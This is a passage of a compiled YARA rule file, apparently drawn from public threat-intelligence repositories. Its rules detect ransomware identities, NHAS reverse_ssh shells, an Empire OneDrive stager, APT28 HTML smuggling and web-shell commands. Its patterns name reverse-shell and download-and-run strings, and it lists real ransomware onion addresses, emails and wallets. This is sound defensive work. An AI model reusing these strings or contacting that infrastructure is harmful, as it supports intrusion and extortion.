		author = "ditekShen"
		id = "ab2cf390-4544-54ed-913c-d463d0f1bdb0"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L523-L531"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "1ab9a2ce7e39d916b389e2adb975e3558ddb7d87f7e9494e6b20cb25edd3cb84"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "Unlockpls.dr01@yahoo.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Blackcat_1
{
	meta:
		description = "Detects files referencing identities associated with BlackCat ransomware"
		author = "ditekShen"
		id = "21038f8e-73cd-59d2-9eb3-6947d263ab79"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L533-L569"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "eb0a4d26170f030775f778cc524749ca283dfa983f84bd364e4df6321eb96cf1"
		score = 75
		quality = 73
		tags = ""

	strings:
		$pk1 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0B0ni9tyKHSJmU6gc1iRwNTklYocRKmLPUyOthUIHnZHwL1M2pKlMBwXx81bboVS6Cf8YaCoWW1bCmLwPX421sG22xkmtMy/SfiG8jaYtYiA7r7hOdIUnJgRo6vDvNafZlSD32tFVVjuX8Ec79qj2FM7/MmNcseUgpIQaEACuZcSzMK+jZA4BLT9b5Akkec2hPOXGTPmgaXjL9EJE+0rhNZcm/m6xe4/S5eL2kSCVsNUeG8xWuSO2kDRS8xY3rtJOCNEdqZp1rxzTkhgj3hHqr7AoFAkxNblQ538JcdF5+CGINxckA/ldmP7wQd92tmFk2vcl2WeQykFwMM6L6MsQwIDAQAB" ascii wide
		$pk2 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA49gzJwP9UwEuYQZT1cdgSpxG6z8TVNLPfS4Qwd3vpWHEOAuvi8JGVEpHPGZnrD1QFoDLSTva3PZ4mqtIVO79GOYb5uQkP7LdJGWbLAjUGptVGmB67jKOOLLrjmuBDHpJXSOGG/vw5vajr4MhNnsvoBLPOC0AOzPM6GBDgKdC9zdUGNEreAjOR4neqwZ2jfYl5k5e3eRF86hmWhGXJQaU1uTmDJwgQIzmUZKo+YCfAHbEbSA4HhsumJfw0MJN7RfKPEQkEVvRIBibHnJuIp1bxk3IGPzTCbyQLHMVLz8wgElEexu8/aO3FT6w4uPY3qD+r2W+ri7xIdEN/pTz6TBKvwIDAQAB" ascii wide
		$pk3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8tKPNFCbU5Unr9jxlTk4RmUdVhcRydJFts6hMpLzcAXIR2yxiNC0QiF4UovAIpGwX6kxOW7kOaOvABJQP6QENMNSg030VlLoTP+ndfFwIt+X+RUflG4UWPE8yu+kzGpCwp7UjX+hD/SpFbSFRRh3BvL3vEq04DzE0AzifEBE4yxKpLsrMsXyZzWy9Nza8NTO2jrBxoEVM2xCLkULp0wZEPDwgeKGkoxMzqavVWBC+Vxi0atKstbo7/TloNenPagl/eUErk9C8tT67zKgbEh3TFtREgaxa/yrjBvN48BU8JGGxLxy4AeGF0vOUdD0WkJsWYzLVg21ApgJaCDr5zDPuQIDAQAB" ascii wide
		$pk4 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApw3tWdMaWJvNf2Mejy5H0Y6kuj+lstNpwFyismGDEYhWKPps9c68xl+84o6uLKfqPzNvLnSxlVa6DitcJGeKJEQkzN+C1e1KsfzM63jHybREB2hs+dHbqBq4dbamIQcTrrr4mKzuHJ7aok4mlpRx2Un1XOJaodoV7xOHO7ui5v6uK39MJ3rvitSEBvv5oI0WDlp3IFmtd6UM6r2nygY1ncAUuasalZgF1Vaz7VXOWyX2ReQHbYWWRCR1qyKMQcBtjT5POXx9B8ek1pnU4p65kGe9M794Bhhh20GN24gY5a+zwXwstaNTO9luwd4xjjRQAVsDgjrjkzti27G11ICn6wIDAQAB" ascii wide
		$pk5 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq8kj5LQJngPsY7AhTaJsUXc5FrSGeKS5gw5PIqk2QPM9TY6+us8TRRzWZ7rGk1zns2klpzpRMUzLIqB8lpCkJjqkOUGfgqs+HN4VIOpoJgFY897xstJCxTc+8pYQEsSqClxJllscU0okkLSQqndIR2Gznlg3qfcwyncJAFBInyqM+L4kbwCQZ6x5HNiLe2lJn8RP2aDiMI+RS1uLYron2G7rxDTUQnxThMtgLAeko8ulaB3TpB0g4lmHCenkEZeBNs81986+MjHnv7KkiscZ7ZrezKjNaIxRs8BAcD9y+Q9QQxCvZMS01ITNXcgiItbA4dsGq1fPJ42yBkkiIodsEQIDAQAB" ascii wide
		$pk6 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqEoytNrMZRoqyIsFpcjiqVWpuV+cC9jS1umXNg/AnJF/xE7LONAmb1p8Dsx1igIUd65IXfFUxmJjFO5hf8LIBzvjUbBll4lbSgGTAUHa3Jbmr/imle6QftmY32J7dDb4WuJUOx+vLNT0I72CESiyotSzwgvLwjyubTmzTJMkqviYOcgDj45NVOx669cG6FWEaJo3PUZzRx9LS6pkOn8tW+W4NzmHMcrma+LOakan7NU6Khv5Hf5ARNsAA+KvDfP1WXJ/VsLXj6x8SdX0v2iS+y58ehUUmlxc8HNsYdOGFwrwYX9zLyJDedsbPg02c4AE4KXt8vH4+j4lVFtruSy4vwIDAQAB" ascii wide
		$pk7 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt9uYkHzaizNXg/S11ncTTLybkMtqrKW8gg6TyzbGWnRNROl9O+l1VZBLG0xiMt1mZbuStl8Lt3l1vlkMa92kgLjN+UfKmq3KhBEheN2uMmR0WpwV83kceVRmzr5lug4RyQ/xA6/OXK4NptDIT4L6CUTBWMyk2mmY0Cq9HyyrjdnHeAXWAcQGFEac7W4jTjONZqI+lgScPewS+cPFnz1hAD0IAqzj5X2mZVSfFGR3tDoIe42jw5wb6W2yi8zb3mgKrGtTBbw0Ppj0UgKrmdN5iFmfUQHLEzKAakDggLcBtrW1o5+4WMaZOLw8maU5byvjXu3F3i3GdQe8SKTYcVK5OQIDAQAB" ascii wide
		$pk8 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAugqZ4ATE9+9FqununW/DBvGosnUX/bNxQzMYUmE14GJIbNa6vwYSNXOlG09mvdAqZqD3lXihWDjy25+gzqSeS+Fs2qNyTdfGPA8iu2xx5RRUXKLGFThxtIzg3fohAK3+LxJVhxtuITAT38IHacc7dVLHsrddu4UDjiHGFdvXjB55Nwe5cu1BYylHsARMYycBA2FwLP57cKvc2/C3OXBAF6qbsVXBcyFhrKOOYA/+5IjFfEhgHy2FLHRf8lmPQPbSlrM6dk+W4D5KVqOPx/eFp0geUJJlmlre3flI29qWS20bkGqAEz9j07y69HGYN9Nt7+DRgBwrpNo/EkZkuaSTtQIDAQAB" ascii wide
		$pk9 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuuAQlnowSGaSi2XgnwaHQAFZ6e7C0SwpAyyLTncJ4l5cwFbM+mwnV+iV3a+ert8WqOmW1aKOCjTPXrXNoirQgboVpLfhIIT1uOOss4O8lodRxgB6QrLCI7PYMZ+8VgIdEPPzsjmTFLxFc7DERxnSjhGdRQIjZNjm7bGScJD0MayDL9KTkVdJtC+C9n5dwEwg6XtQbwLDeaGZaByOgB/zR6tlcPQCNU9rj1qfcVrI/dFW4br/NnJbqrH714z+dvCa18IJTcu3kW74CAilvHrl5qFDd8CCQhjLrjQDPxAoCba9aXKr6dwt34/MU0tVRTYjzMAxR4yTh3oEjVT+HifvVwIDAQAB" ascii wide
		$pk10 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcPjnPl8bI1A0iudX70FKkTjnLjHyetHN2kAIcyOG10K8vm67n/Ma9mAnoDggD3D6UtAbwjvHwPW1m9WF+MrnBXmBizE0JpwOLtVFcHeVLJXlYn/C5RNZziTCwjauH6TlT7Mo/oHfg7nX4IXEuaeAZz8g9ioeJ1Lydi9ZZM1gmdNk8KuKR0zrrJ6MMAGrhMtblLFVwtMn7IlNjT/BgSL4pDyNa++wI5P4R2rMykJwGu/7o2kKE2IFimtFDyZ5a+CX46cdKt7uo5eKFiqf/jTes9/y5AgoS69mt4fRvWFhP7qHXRO2gG8XAc+9suhiuVUWZTAu3xXz5VsmBtk8pzcpwIDAQAB" ascii wide
		$pk11 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwMQXFMtYf60KrbUVwNVoPhhrCTNMY3Zv+/WULZRZfJ4dMhYozDxtRVdtBDKtuYuHCGLu/Ymf9wKFFXgVH3En7qI1sU2UdjNR4086X8oSTMUn/GwEAEIZAHtSFuk6AXcXW+eO0yxPF+lt5AZcNnJocWBVZ8RWGvsQdtGgtZalttAynROC4RUGkvD1h1ssMteHWneFLpfzSPGlbu0s0cemsrTPmhexGIenup/YjNdmhbfvvYE9kZfPebGtZHw6oQXWcG7sAlvkGciJl3Eo9FznNj0K+v8WQW5L/UbosZaYVJbxlbtySvqUqZbkLKsmp91tr9bvTiDMZuXZS7iHVqchUQIDAQAB" ascii wide
		$pk12 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxbKVxwYe4PpnPm0XtuqShDqFWCFRBw0tYo2vmLwVPlwa+0+ox8+nF0mzWC3ZZT2XkGSodszosOoocfKAwOjQnA+4/Hokl4hgG6K8O7wWuWlvgo4fkcZShy2cMY9FaC6e4bMfurlDFt7OVrKKWAyEGv49Etq6LNoyl5ddM/XmspG52gscRoIcOTwBL4bD8nVcamZXqE4j2mS62HicQ6q9YgRVs1PLbgVPbg8c2rFzpN1e8wZdPtvyGON0m3CmxsYa63yianbnBAS4WnxEnoI7eCZZNkblr+kZB4J9War5VYHu9lFw4XWeuHget/Rn8oGCJOMHkZMz23NpUVaX9htQAwIDAQAB" ascii wide
		$url1 = "://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd.onion" ascii wide
		$url2 = "://alphvmmm27o3abo3r2mlmjrpdmzle3rykajqc5xsj7j7ejksbpsa36ad.onion" ascii wide
		$url3 = "://2cuqgeerjdba2rhdiviezodpu3lc4qz2sjf4qin6f7std2evleqlzjid.onion" ascii wide
		$url4 = "://aoczppoxmfqqthtwlwi4fmzlrv6aor3isn6ffaiic55wrfumxslx3vyd.onion" ascii wide
		$url5 = "://b4twqa2mvob3s6uvuyfra5xk3qgps2v5kkt7k2qnb7rpdu3j4fkntead.onion" ascii wide
		$url6 = "://b6v4ojs7jfvftvcoagjxp7qz33yeljydqy6afzsh26vqbzcjwz4b3zad.onion" ascii wide
		$url7 = "://htnpafzbvddr2llstwbjouupddflqm7y7cr7tcchbeo6rmxpqoxcbqqd.onion" ascii wide
		$url8 = "://id7seexjn4bojn5rvo4lwcjgufjz7gkisaidckaux3uvjc7l7xrsiqad.onion" ascii wide
		$url9 = "://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd.onion" ascii wide
		$url10 = "://odf3dt34tkqndw5h2l5gt2gwwd3jct5rwwjusbd3vlin2jueyv2qkgid.onion" ascii wide
		$url11 = "://rfosusl6qdm4zhoqbqnjxaloprld2qz35u77h4aap46rhwkouejsooqd.onion" ascii wide
		$url12 = "://sty5r4hhb5oihbq2mwevrofdiqbgesi66rvxr5sr573xgvtuvr4cs5yd.onion" ascii wide
		$url13 = "://xqoykemmcivwtpxh3a6pu3w7sstr2y7hapxdiv4caaxidurmwwbjx2id.onion" ascii wide
		$url14 = "://y4722ss64vel5hmph75te7lx2x5xz463322ypjirm5ytxviijtdpybid.onion" ascii wide

	condition:
		(1 of ( $pk* ) and 1 of ( $url* ) )
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Koxic_1
{
	meta:
		description = "Detects files referencing identities associated with LokiLocker ransomware"
		author = "ditekShen"
		id = "4c4ff722-cac1-5967-9e79-681f47566e96"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L571-L580"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "ca4d0e85cf4c7a134609262e21d5cef98100ba0a046d17ffe51bf3975dc7cae9"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "wilhelmkox@tutanota.com" ascii wide nocase
		$s2 = "F3C777D22A0686055A3558917315676D607026B680DA5C8D3D4D887017A2A844F546AE59F59F" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Ryuk_1
{
	meta:
		description = "Detects files referencing identities associated with Ryuk ransomware"
		author = "ditekShen"
		id = "00cf99da-ff3c-5c91-8966-69a8afc8613a"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L582-L592"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "a2b6106fc49dd254ca936e285fa0c2a3aee7110832686638d20d369d77f6c48f"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "WayneEvenson@protonmail.com" ascii wide nocase
		$s2 = "WayneEvenson@tutanota.com" ascii wide nocase
		$s3 = "14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Lockdown_1
{
	meta:
		description = "Detects files referencing identities associated with LockDown / cantopen ransomware"
		author = "ditekShen"
		id = "603f0113-d77b-590c-b2a0-804c6d1fbfbc"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L594-L603"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "cb17bb92d6e8189a08508481b75d301a1227906815c684753859914d77d7b3e7"
		score = 75
		quality = 73
		tags = ""

	strings:
		$s1 = "CCWhite@onionmail.org" ascii wide nocase
		$s2 = "bc1q6ug0vrxz66d564qznclu9yyyvn6zurskezmt64" ascii wide

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Powershellcookiestealer_1
{
	meta:
		description = "Detects email accounts used for exfiltration observed in PowerShellCookieStealer"
		author = "ditekShen"
		id = "c2bbb9a8-3e4c-5676-9676-2708a196ef8d"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L706-L715"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "bd404e94939acb92dd56a7d2a1f7536bcb3f520ca1e9dc614b53828afbc6dac8"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "senmn0w@gmail.com" ascii wide nocase
		$s2 = "mohamed.trabelsi.ena2@gmail.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Rhysida_1
{
	meta:
		description = "Detects files referencing identities associated with Rhysida ransomware"
		author = "ditekShen"
		id = "7ee0fb41-9267-5b65-ada3-229f2e390da6"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1688-L1697"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "e3e07bab2982a30a5372e6708ede6707d132d410aa5b5b1a29bdb5d06910a88e"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "SethZemlak@onionmail.org" ascii wide nocase
		$s2 = "JacquieKunze@onionmail.org" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_KB_ID_Ransomware_Payola_1
{
	meta:
		description = "Detects files referencing identities associated with Payola ransomware"
		author = "ditekShen"
		id = "7c1fc06b-fc71-5679-befd-686b2e05e3a4"
		date = "2024-01-23"
		modified = "2024-01-23"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_knownbad_id.yar#L1699-L1708"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "568141c03d14faef0cfc4f5fbdec45a5109a1ad5cbbe99e76a1db86e7ef4dc5d"
		score = 75
		quality = 71
		tags = ""

	strings:
		$s1 = "pcsupport@skiff.com" ascii wide nocase
		$s2 = "pctalk01@tutanota.com" ascii wide nocase

	condition:
		any of them
}

rule DITEKSHEN_INDICATOR_OLE_Remotetemplate_1
{
	meta:
		description = "Detects XML relations where an OLE object is refrencing an external target in dropper OOXML documents"
		author = "ditekSHen"
		id = "fbf40436-fc0a-5e55-89ac-5e1dd93e1833"
		date = "2024-09-06"
		modified = "2024-09-06"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_office.yar#L691-L702"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "80cc5b1a8a8899f632401956055374d265c734449e56ffeee5f0ba4911050f36"
		score = 75
		quality = 75
		tags = ""

	strings:
		$olerel = "relationships/oleObject" ascii
		$target1 = "Target=\"http" ascii
		$target2 = "Target=\"file" ascii
		$mode = "TargetMode=\"External" ascii

	condition:
		$olerel and $mode and 1 of ( $target* )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Pe_Inmem_Large_1
{
	meta:
		description = "Matches packed NHAS reverse_ssh PE samples in-memory during execution"
		author = "HarfangLab"
		id = "f6b38e11-c405-5623-bea3-3a8d96b435af"
		date = "2024-09-24"
		modified = "2025-04-16"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/1df815f4210f1d26151026cdd9658dbfc262b019/hl_public_reports_master.yar#L276-L294"
		license_url = "N/A"
		hash = "7798b45ffc488356f7253805dc9c8d2210552bee39db9082f772185430360574"
		logic_hash = "b9bbbbd93dc39f8c16c7f8275fa73f4c345c3ba8f21da76ae491e89d3a22c473"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "\\rprichard\\proj\\winpty\\src\\agent\\" ascii
		$s2 = "\\Users\\mail\\source\\winpty\\src\\" ascii
		$s3 = "Successfully connnected" ascii
		$s4 = "*main.decFunc" ascii fullword
		$s6 = "keepalive-rssh@golang.org" ascii fullword
		$s7 = ".(*sshFxpSetstatPacket)." ascii

	condition:
		( all of them )
}

rule HARFANGLAB_Nhas_Reverse_Shell_Elf_Inmem_Large_1
{
	meta:
		description = "Matches packed NHAS reverse_ssh ELF samples in-memory during execution"
		author = "HarfangLab"
		id = "cd6f7b81-b8df-5e2b-9da6-981d1f62c131"
		date = "2024-09-24"
		modified = "2025-04-16"
		reference = "TRR250201"
		source_url = "https://github.com/HarfangLab/iocs/blob/1df815f4210f1d26151026cdd9658dbfc262b019/hl_public_reports_master.yar#L295-L312"
		license_url = "N/A"
		hash = "9f97997581f513166aae47b3664ca23c4f4ea90c24916874ff82891e2cd6e01e"
		logic_hash = "54ba4fc366fb6e4a252d51528ede3ec418b369881ad98e9119d1a9650b6a1bab"
		score = 75
		quality = 80
		tags = ""
		context = "memory"

	strings:
		$s1 = "/NHAS/reverse_ssh/cmd/client" ascii
		$s2 = "/handlers.runCommandWithPty" ascii
		$s3 = "/connection.RegisterChannelCallbacks" ascii
		$s4 = "/internal.RemoteForwardRequest" ascii
		$s7 = "main.Fork" ascii fullword

	condition:
		( all of them )
}

rule SEKOIA_Malware_Win_Lyceum_Maldoc_Macro_20220613_1
{
	meta:
		description = "Detect the macro contained in Lyceum maldoc to deploy its malware"
		author = "Sekoia.io"
		id = "3046bffd-261f-4d5b-9015-f2e5fc31c9c9"
		date = "2022-06-13"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/malware_win_lyceum_maldoc_macro_20220613.yar#L1-L15"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a9f4957e8198b4cb2229913a405b3e0fc97cbd3598bb583dbfdaf56ca278d4cb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "ActiveDocument.InlineShapes(i).PictureFormat.Brightness = 0.5" ascii

	condition:
		all of them
}

rule SEKOIA_Apt_Apt28_Htmlsmuggling_1
{
	meta:
		description = "Detects some kind of HTMLSmuggling used by APT28"
		author = "Sekoia.io"
		id = "2e20c992-d971-4c0f-99b3-a7d528c7055a"
		date = "2023-09-11"
		modified = "2024-12-19"
		reference = "https://www.zscaler.com/blogs/security-research/steal-it-campaign"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_apt28_htmlsmuggling.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "47cca1d0a0843c8df43661ee8188dae86cce06e1f3982973871863728d328e89"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "click();" ascii
		$s2 = "window.location.replace("

	condition:
		$s1 in ( @s2 .. @s2-100 )
}

rule SEKOIA_Apt_Kimsuky_Sharpext_Compromised_Securepreferences_1
{
	meta:
		description = "Detects compromised Chrome SecurePreferences file"
		author = "Sekoia.io"
		id = "aeda5d15-82e1-4ffc-8252-1eb4fc78d024"
		date = "2022-07-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_kimsuky_sharpext_compromised_securepreferences.yar#L1-L17"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "662358fdb4c4cfa9984d06e391ade52e1c7a3d7b78724aea4fb0d6035fe2e7b2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "\"devtools\", \"tabs\", \"webNavigation\", \"webRequest\", \"webRequestBlocking\""
		$ = "AppData\\\\Roaming"
		$ = "https://*/*"

	condition:
		all of them
}

rule SEKOIA_Gen_Empire_Onedrive_Stager_1
{
	meta:
		description = "Detects the Empire OneDrive stager"
		author = "Sekoia.io"
		id = "2053416f-1f53-491e-9c70-787a04362d16"
		date = "2022-01-26"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/gen_empire_onedrive_stager.yar#L1-L16"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "90b3548cd3f4f7f936da70ec95dbe0ff3c1421d40a6e8557952d28d358b7c1f1"
		score = 75
		quality = 76
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$sleep = "Start-Sleep -Seconds $(($PI -as [Int])*2)" wide ascii nocase
		$down = "wc.DownloadData" wide ascii nocase

	condition:
		$down in ( @sleep .. @sleep + 1000 )
}

rule SEKOIA_Downloader_Mac_Rustbucket_Swiftloader_1
{
	meta:
		description = "Detect the file com.EdoneViewer in the new version of RustBucker 2023-10"
		author = "Sekoia.io"
		id = "bdbc95db-5d58-4c96-91f9-34b653e67f50"
		date = "2023-12-05"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/downloader_mac_rustbucket_swiftloader.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "acb5b88f8af53cd3d83de0fd6c3049ce017f038dc7c8b31f70e65e60bf713dfb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "7c5bf60787bfd076c8806eaa4f1185f5b9fda69008376624ab3d17f207eb16a4"
		hash2 = "bc90adde92bd47b4de7d384e5b20c1a1791d603629bd0fcba4b550fb35e93216"
		hash3 = "c9a7b42c7b29ca948160f95f017e9e9ae781f3b981ecf6edbac943e52c63ffc8"

	strings:
		$ = "/Users/ghost/Desktop/EdoneViewer/EdoneViewer/"
		$ = "EdoneViewerApp.swift"

	condition:
		1 of them
}

rule SEKOIA_Tool_Enum4Linux_Strings_1
{
	meta:
		description = "Detects enum4linux based on strings"
		author = "Sekoia.io"
		id = "6b3094fe-1292-4da3-a1ed-9e255be531da"
		date = "2024-02-02"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/tool_enum4linux_strings.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "d3f7ddbdfb679b34777298aec84464d55fac7600b855526a7f13d8c8f17ab888"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "my $os_info = `$command`;"
		$ = "($global_workgroup) = $os_info =~"
		$ = "sub enum_groups {"
		$ = "if ($shares =~ /NT_STATUS_ACCESS_DENIED/) {"
		$ = "Can't open share list file $shares_file"
		$ = "my $users = `$command`;"
		$ = "my @shares = <SHARES>;"
		$ = "foreach my $grouptype (\"builtin\", \"domain\") {"

	condition:
		6 of them
}

rule SEKOIA_Apt_Unk_Hrserv_Memory_Commands_Strings_1
{
	meta:
		description = "Detects HrServ web shell memory commands"
		author = "Sekoia.io"
		id = "1b5f442a-e758-4bd5-a612-8b504a542d29"
		date = "2023-11-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/apt_unk_hrserv_memory_commands_strings.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "a87c35658ded301c098f9ee8ee5886a54e89537eabd145cf82b0286c703a77d2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "list all the process" ascii wide
		$ = "equal with cmd /c tasklist" ascii wide
		$ = "start target service by name" ascii wide
		$ = "query local process information by wmi." ascii wide
		$ = "upload local shellcode to" ascii wide

	condition:
		all of them
}

rule SEKOIA_Water_Sigbin_Group_1
{
	meta:
		description = "Detects IOCs related to the 8220 Mining group."
		author = "Sekoia.io"
		id = "c49728e8-db7e-4d83-97d2-7d56b51f8a52"
		date = "2024-06-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/yara_rules/water_sigbin_group.yar#L1-L18"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/e00b1ef08f974e483260719ce04b78fa8b79ee56/LICENSE.md"
		logic_hash = "dd51945bf79e37b50d377eda3641eb32438dcb5a1c55fb4a9b66a5b5a8b5ed0d"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "Z12A3" ascii fullword
		$s2 = "FromBase64String" ascii fullword
		$s3 = "Start-Process" ascii fullword
		$s4 = "WriteAllBytes" ascii fullword

	condition:
		all of them
}

rule SEKOIA_Storm_1811_Files_Dat_1
{
	meta:
		description = "Detects files used in a campaign performed by the intrusion set Storm-1811"
		author = "Sekoia.io"
		id = "8b14f276-0c39-422b-9b19-d96b139a7ae8"
		date = "2024-06-10"
